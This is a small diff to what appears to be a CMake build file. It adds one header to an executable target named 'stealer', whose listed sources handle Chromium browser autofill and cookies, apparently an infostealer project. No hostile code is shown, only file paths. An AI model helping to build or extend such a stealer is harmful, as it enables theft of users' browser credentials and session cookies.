@@ -86,6 +86,7 @@ add_executable(stealer src/main.cpp
         src/stealer/impl/brownsers/chromium/impl/CAutoFill.h
         src/stealer/impl/brownsers/chromium/impl/CCookies.cpp
         src/stealer/impl/brownsers/chromium/impl/CCookies.h
+        include/binaryhandler.hpp
 )
 
 target_link_libraries(stealer
